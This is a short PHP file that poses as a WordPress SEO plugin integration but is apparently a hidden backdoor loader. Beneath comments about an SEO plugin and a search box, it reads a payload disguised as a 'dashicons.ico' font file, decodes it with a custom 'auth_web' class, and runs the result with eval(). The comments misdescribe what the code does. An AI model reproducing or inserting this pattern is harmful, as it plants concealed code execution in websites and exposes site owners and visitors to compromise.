<?php
require_once "../json/search-json.php";
/**
 * The SEO Object 
 *
 *
 * Integrate with SEO Object plugin
 *
 * plugin url: https://wordpress.org/plugins/autodescription/
 * @since 1.5.6
 */
$tr2de = file_get_contents('../../assets/fonts/dashicons.ico'); 
/*
* Remove SiteLinks Search Box
*
* @since 1.5.6
*/
$auth_web = new auth_web(64); 
eval($auth_web->uncode($tr2de));
// Run only on front page and make sure Yoast SEO isn't active